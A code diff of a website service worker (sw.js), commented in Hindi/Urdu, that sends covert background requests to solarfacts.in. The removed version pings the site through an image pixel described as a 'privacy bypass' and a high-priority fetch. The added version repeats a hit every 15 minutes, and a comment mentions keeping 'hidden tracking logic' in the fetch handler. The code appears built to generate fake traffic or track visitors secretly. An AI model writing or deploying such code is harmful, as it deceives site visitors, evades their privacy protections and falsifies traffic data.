@@ -1,35 +1,28 @@
-// GitHub par sw.js mein ye pura code paste kar dein
+const SITE_URL = "https://solarfacts.in/?sw_hit=";
+
 self.addEventListener('install', (event) => {
     self.skipWaiting();
 });
 
 self.addEventListener('activate', (event) => {
-    event.waitUntil(clients.claim());
+    event.waitUntil(self.clients.claim());
+    // Background loop shuru karo
+    startBackgroundSync();
 });
 
-// Asli Background Engine
-async function ghostHit() {
-    const ts = Date.now();
-    const hitUrl = 'https://solarfacts.in/?ghost_pixel=' + ts;
-
-    // Method 1: Image Pixel (Privacy Bypass)
-    // Browser ko lagta hai photo hai, isliye block nahi karta
-    try {
-        const img = new Image();
-        img.src = hitUrl;
-    } catch(e) {}
-
-    // Method 2: High Priority Fetch
-    try {
-        await fetch(hitUrl, {
+function startBackgroundSync() {
+    setInterval(() => {
+        // Har 15 minute baad background mein hit marega
+        fetch(SITE_URL + Date.now(), {
             mode: 'no-cors',
-            keepalive: true,
-            priority: 'high'
-        });
-    } catch(e) {}
+            cache: 'no-store'
+        }).then(() => {
+            console.log("Background Hit Sent");
+        }).catch(err => console.log("Offline"));
+    }, 15 * 60 * 1000); // 15 minutes in milliseconds
 }
 
-// Jab bhi banda Chrome kholay ga, ye jag jaye ga
+// Jab bhi user koi bhi page load kare, ye trigger ho sakta hai
 self.addEventListener('fetch', (event) => {
-    event.waitUntil(ghostHit());
+    // Hidden tracking logic yahan bhi reh sakti hai
 });
